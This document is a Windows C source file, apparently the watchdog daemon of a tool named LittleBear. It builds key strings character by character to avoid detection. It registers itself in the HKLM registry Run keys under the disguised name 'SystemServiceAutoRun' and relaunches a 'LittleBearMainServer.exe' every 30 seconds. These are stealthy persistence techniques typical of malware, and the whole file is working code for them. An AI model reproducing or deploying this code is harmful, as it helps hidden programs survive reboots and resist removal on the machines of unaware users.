#include <windows.h>
#include "LittleBearProtect.h"


#define LITTLEBEAR_SERVER_NAME	"LittleBearMainServer.exe"
#define LOGFILENAME				"daemonlog.txt"
#define MAX_WSPRINTF_BUFFER_SIZE	1024




int GetCpuBits()
{
	BOOL bIsWow64 = FALSE;
	//IsWow64Process is not available on all supported versions of Windows.
	//Use GetModuleHandle to get a handle to the DLL that contains the function and GetProcAddress to get a pointer to the function if available.
	char szKernel32[] = {'k','e','r','n','e','l','3','2',0};
	char szIsWow64Process[] = {'I','s','W','o','w','6','4','P','r','o','c','e','s','s',0};
	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	HMODULE hDllKernel32 = GetModuleHandleA(szKernel32);
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(hDllKernel32,szIsWow64Process);
	if(NULL != fnIsWow64Process)
	{
		int iRet = fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
		if (iRet)
		{
			if (bIsWow64)
			{
				return 64;
			}
		}
	}
	return 32;
}


int SetBootAutoRunInRegistryRun(HKEY hMainKey,char * strPEResidence)
{
	unsigned char szQueryValue[MAX_PATH];
	unsigned long iQueryLen = MAX_PATH;
	unsigned long iType = 0; 

	char szKeyAutoRun[] = {'S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0};

	char szValueAutoRun[] = {'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0};	

	char szKeyAutoRun64[] = {'S','o','f','t','w','a','r','e',0x5c,'W','o','w','6','4','3','2','N','o','d','e',
		0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0};

	DWORD dwDisPos = 0;
	HKEY hKey = 0;
	int iRes = 0;
	DWORD iCpuBits = GetCpuBits();
	if(iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		iRes = RegCreateKeyExA(hMainKey,szKeyAutoRun64,0,REG_NONE,REG_OPTION_NON_VOLATILE,KEY_READ|KEY_WRITE,0,&hKey,&dwDisPos);
		if(iRes != ERROR_SUCCESS)
		{
			WriteLog("SetBootAutoRunInRegistryRun lpRegCreateKeyExA error\r\n");
			return FALSE;
		}

		//if value is 234 ,it means out buffer is limit
		iRes = RegQueryValueExA(hKey,szValueAutoRun,0,&iType,szQueryValue,&iQueryLen);
		if(iRes == ERROR_SUCCESS && lstrcmpA((char*)szQueryValue,strPEResidence) == 0)
		{
			WriteLog("SetBootAutoRunInRegistryRun lpRegQueryValueExA,the key may be exist\r\n");
			RegCloseKey(hKey);
			return TRUE;
		}
		else
		{
			iRes = RegSetValueExA(hKey,szValueAutoRun,0,REG_SZ,(unsigned char*)strPEResidence,lstrlenA(strPEResidence));
			if (iRes != ERROR_SUCCESS)
			{
				WriteLog("SetBootAutoRunInRegistryRun lpRegSetValueExA error\r\n");
				RegCloseKey(hKey);
				return TRUE;
			}
			else
			{
				RegFlushKey(hKey);
				WriteLog("SetBootAutoRunInRegistryRun lpRegSetValueExA ok\r\n");
				RegCloseKey(hKey);
				return TRUE;
				//u can move it into setup folder
			}
		}
	}
	else
	{
		int iRes = RegCreateKeyExA(hMainKey,szKeyAutoRun,0,REG_NONE,REG_OPTION_NON_VOLATILE,KEY_READ|KEY_WRITE,0,&hKey,&dwDisPos);
		if (iRes == ERROR_SUCCESS)
		{
			iRes = RegQueryValueExA(hKey,szValueAutoRun,0,&iType,szQueryValue,&iQueryLen);
			if (iRes == ERROR_SUCCESS&& lstrcmpA((char*)szQueryValue,strPEResidence) == 0)
			{
				WriteLog("SetBootAutoRunInRegistryRun lpRegQueryValueExA 32 bit the key is already exist\r\n");
				RegCloseKey(hKey);
				return TRUE;
			}
			else
			{
				iRes = RegSetValueExA(hKey,szValueAutoRun,0,REG_SZ,(unsigned char*)strPEResidence,lstrlenA(strPEResidence));
				if (iRes != ERROR_SUCCESS)
				{
					WriteLog("SetBootAutoRunInRegistryRun lpRegSetValueExA 32 bit error\r\n");
					RegCloseKey(hKey);
					return TRUE;
				}
				else
				{
					RegFlushKey(hKey);
					WriteLog("SetBootAutoRunInRegistryRun lpRegSetValueExA 32 bit ok\r\n");
					RegCloseKey(hKey);
					return TRUE;
					//u can move it into setup folder
				}
			}
		}
		else
		{
			WriteLog("SetBootAutoRunInRegistryRun lpRegCreateKeyExA 32 bit error\r\n");
			return FALSE;
		}		
	}

	return FALSE;
}



int GetPathFromFullName(char* strFullName,char * strDst)
{
	RtlZeroMemory(strDst,MAX_PATH);
	RtlMoveMemory(strDst,strFullName,lstrlenA(strFullName));

	char * pStr = strDst;
	for (int i = lstrlenA(strDst); i > 0 ; i--)
	{
		if (pStr[i] == 0x5c)
		{
			pStr[i + 1] = 0;
			return TRUE;
		}
	}

	return FALSE;
}


int WriteLog(char * pLog)
{
	HANDLE hFile = CreateFileA(LOGFILENAME,GENERIC_WRITE,0,0,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int iRet = SetFilePointer(hFile,0,0,FILE_END);

	char szTime[MAX_PATH];
	SYSTEMTIME stTime = {0};
	GetLocalTime(&stTime);
	wsprintfA(szTime,"%u-%u-%u %d:%d:%d ",stTime.wYear,stTime.wMonth,stTime.wDay,stTime.wHour,stTime.wMinute,stTime.wSecond);
	DWORD dwCnt = 0;
	char szMsg[MAX_WSPRINTF_BUFFER_SIZE];
	int iLen = wsprintfA(szMsg,"%s %s",szTime,pLog);

	iRet = WriteFile(hFile,szMsg,iLen,&dwCnt,0);
	if (iRet == FALSE  || dwCnt != iLen)
	{
		CloseHandle(hFile);
		return FALSE;
	}

	CloseHandle(hFile);
	return TRUE;
}



int __stdcall MainProc()
{
	DWORD dwRet = 0;
	
	char szCurPath[MAX_PATH];
	char szFullFileName[MAX_PATH];
	dwRet = GetModuleFileNameA(0,szFullFileName,MAX_PATH);

	dwRet = SetBootAutoRunInRegistryRun(HKEY_LOCAL_MACHINE,szFullFileName);

	dwRet = GetPathFromFullName(szFullFileName,szCurPath);
	dwRet = SetCurrentDirectoryA(szCurPath);
	lstrcatA(szCurPath,LITTLEBEAR_SERVER_NAME);
	DWORD dwCnt = 0;
	while(TRUE)
	{
		HANDLE hServer = CreateFileA(szCurPath,GENERIC_READ | GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
		if(hServer == INVALID_HANDLE_VALUE)
		{
			DWORD dwFlag = GetLastError();
			if (dwFlag == 2 || dwFlag == 3 )
			{
				MessageBoxA(0,"server not found","server not found",MB_OK);
			}
			else if (dwFlag == 32 || dwFlag == 33 || dwFlag == 4 || dwFlag == 5)
			{
				//WriteLog("without right to operation the server,maybe the server is running\r\n");
			}
			else
			{
				char szShowinfo[1024];
				wsprintfA(szShowinfo,"unexpected error,errorcode:%u\r\n",dwRet);
				WriteLog(szShowinfo);
			}
		}
		else
		{
			CloseHandle(hServer);
			dwRet = WinExec(LITTLEBEAR_SERVER_NAME,SW_SHOWNORMAL);
		}

		Sleep(30000);
	}

	return TRUE;
}

int __stdcall WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
{
	MainProc();
	return TRUE;
}